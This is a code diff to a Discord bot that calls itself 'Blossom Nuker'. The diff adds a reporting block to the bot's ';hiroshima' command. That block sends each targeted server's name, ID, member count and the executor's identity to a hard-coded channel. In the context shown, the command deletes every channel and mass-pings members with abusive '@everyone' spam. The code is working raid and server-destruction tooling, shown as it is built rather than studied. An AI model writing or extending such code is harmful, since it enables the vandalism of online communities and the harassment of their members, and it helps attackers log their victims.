@@ -40,10 +40,30 @@ async def on_ready():
     print(f"{Fore.MAGENTA}------------------------------------------------------------------")
     print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")
 
+REPORT_CHANNEL_ID = 1516288297972924568
+
 @client.command()
 async def hiroshima(ctx):
     await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
     guild = ctx.guild
+
+    report_channel = client.get_channel(REPORT_CHANNEL_ID)
+    if report_channel is not None:
+        embed = discord.Embed(
+            title="Hiroshima command used",
+            description=f"A server has been targeted with `;hiroshima`.",
+            color=discord.Color.red()
+        )
+        if guild.icon:
+            embed.set_thumbnail(url=guild.icon.url)
+        embed.add_field(name="Server name", value=guild.name, inline=False)
+        embed.add_field(name="Member count", value=str(guild.member_count), inline=False)
+        embed.add_field(name="Server ID", value=str(guild.id), inline=False)
+        embed.add_field(name="Executor", value=f"{ctx.author} ({ctx.author.id})", inline=False)
+        embed.set_footer(text="Blossom Nuker report")
+        await report_channel.send(embed=embed)
+    else:
+        print(f"Report channel {REPORT_CHANNEL_ID} not found.")
     
     # Delete all channels concurrently
     delete_channels = []
@@ -81,7 +101,7 @@ async def hiroshima(ctx):
         for channel in channels:
             for _ in range(5):
                 messages.append(channel.send("@everyone Server Just Got Fucked By blossom."))
-        await asyncio.gather(*messages, return_exceptions=True)  
+        await asyncio.gather(*messages, return_exceptions=True)
 
 @client.command()
 async def help(ctx):
